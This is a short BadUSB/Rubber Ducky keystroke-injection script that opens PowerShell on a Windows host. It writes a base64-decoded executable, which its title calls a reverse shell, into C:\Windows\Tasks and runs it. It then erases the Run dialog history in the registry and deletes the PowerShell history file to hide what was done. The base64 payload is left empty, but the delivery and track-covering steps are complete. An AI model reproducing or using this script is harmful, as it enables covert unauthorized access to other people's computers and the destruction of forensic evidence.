REM base64_to_resverse_shell.txt
REM
REM Description:
REM   A script that will covertt base 64 to an exe and run it on a windows host

DELAY 500
GUI r
STRING powershell
ENTER
DELAY 200
STRING [IO.File]::WriteAllBytes("C:\Windows\Tasks\a.exe", [Convert]::FromBase64String(""))
ENTER

STRING &"C:\Windows\Tasks\a.exe"
ENTER

STRING Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*"
ENTER

STRING Remove-Item "$env:USERPROFILE\Documents\PowerShell\ConsoleHost_history.txt"
ENTER

STRING exit
ENTER
